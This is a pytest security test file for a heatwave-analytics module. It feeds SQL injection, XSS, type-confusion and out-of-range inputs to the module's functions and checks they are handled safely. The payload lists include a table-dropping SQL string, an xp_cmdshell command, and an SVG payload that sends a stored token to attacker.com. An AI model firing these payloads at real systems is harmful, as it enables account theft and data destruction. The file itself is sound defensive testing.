"""
Security Testing & Quality Assurance Test Suite
Corresponds to STQA Experiment 05: Security Testing
Tests OWASP Top 10 vectors against HeatAware AI Platform
"""

import pytest
import html
import re
import os
from weather_analytics import (
    calculate_temperature_anomaly,
    classify_heatwave_risk,
    calculate_heat_index,
    generate_stakeholder_advisory,
    filter_telemetry_data
)

class TestSecurityScenarios:
    """
    Validates 5+ core web security test scenarios:
    1. SQL Injection / NoSQL Injection Payload Resilience
    2. Cross-Site Scripting (XSS) Input Sanitization & Escaping
    3. Input Validation & Type Confusion Attack Mitigation
    4. Boundary Value / Denial of Service (DoS) Buffer Overflow Resilience
    5. Broken Object Level Authorization / Parameter Tampering Guard
    """

    # -------------------------------------------------------------------------
    # Scenario 1: SQL / Script Injection Payload Resistance
    # -------------------------------------------------------------------------
    @pytest.mark.parametrize("malicious_input", [
        "' OR '1'='1",
        "'; DROP TABLE telemetry; --",
        "admin' --",
        "1; EXEC xp_cmdshell('whoami'); --",
        "' UNION SELECT username, password FROM users --"
    ])
    def test_sql_injection_resilience(self, malicious_input):
        """Ensures stakeholder advisory generator handles SQL injection payloads without crashing or leaking syntax."""
        # Function must treat the SQL injection payload purely as an unescaped literal or reject safely
        advisory = generate_stakeholder_advisory(region=malicious_input, risk_level="Normal Risk", category="general")
        assert malicious_input in advisory
        assert "DROP TABLE" not in advisory.upper() or f"[{malicious_input}]" in advisory

    # -------------------------------------------------------------------------
    # Scenario 2: Cross-Site Scripting (XSS) Input Neutralization
    # -------------------------------------------------------------------------
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=fetch('http://attacker.com/?stolen='+localStorage.getItem('token'))>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>"
    ])
    def test_cross_site_scripting_neutralization(self, xss_payload):
        """Verifies that advisory generation safely encapsulates HTML/JS injection payloads."""
        advisory = generate_stakeholder_advisory(region=xss_payload, risk_level="Extreme Alert", category="urban_health")
        # When rendered in HTML contexts, tags must be safe or escapable
        sanitized = html.escape(advisory)
        assert "<script>" not in sanitized
        assert "<svg" not in sanitized
        assert "&lt;script&gt;" in sanitized or xss_payload in advisory

    # -------------------------------------------------------------------------
    # Scenario 3: Input Validation & Type Confusion Defence
    # -------------------------------------------------------------------------
    @pytest.mark.parametrize("invalid_temp, invalid_baseline", [
        ("45.0", 30.0),                  # String instead of float
        ([45.0], 30.0),                  # List object injection
        ({"temp": 45.0}, 30.0),          # Dict injection
        (None, 30.0),                    # Null pointer injection
        (True, False)                    # Boolean type confusion
    ])
    def test_type_confusion_and_injection_defence(self, invalid_temp, invalid_baseline):
        """Ensures arithmetic operations strictly enforce numeric types and raise TypeError."""
        with pytest.raises(TypeError):
            calculate_temperature_anomaly(invalid_temp, invalid_baseline)

    # -------------------------------------------------------------------------
    # Scenario 4: Boundary Overflow & Value Range Enforcement (DoS Prevention)
    # -------------------------------------------------------------------------
    @pytest.mark.parametrize("out_of_bounds_humidity", [
        -1.0, -100.0, 100.1, 1000.0, float('inf'), float('-inf')
    ])
    def test_out_of_bounds_rejection(self, out_of_bounds_humidity):
        """Prevents computational overflow or algorithm instability on abnormal sensor data."""
        with pytest.raises(ValueError):
            calculate_heat_index(temp_celsius=40.0, relative_humidity=out_of_bounds_humidity)

    # -------------------------------------------------------------------------
    # Scenario 5: Telemetry Tampering & Broken Data Ingestion Guard
    # -------------------------------------------------------------------------
    def test_telemetry_tampering_and_malformed_records(self):
        """Tests that malformed, corrupted, or malicious sensor telemetry packets are securely pruned."""
        corrupted_payload = [
            {"station_id": "STN-01", "temperature": 42.5},                     # Valid
            {"station_id": "<script>alert(1)</script>", "temperature": -99.0}, # Negative out-of-range
            {"station_id": "STN-02", "temperature": "CORRUPTED_STRING"},       # Type confusion
            {"invalid_key": "No temperature key"},                              # Missing key
            {"station_id": "STN-03", "temperature": 44.1}                      # Valid
        ]
        
        filtered = filter_telemetry_data(corrupted_payload, min_temp=0.0)
        assert len(filtered) == 2
        assert filtered[0]["station_id"] == "STN-01"
        assert filtered[1]["station_id"] == "STN-03"
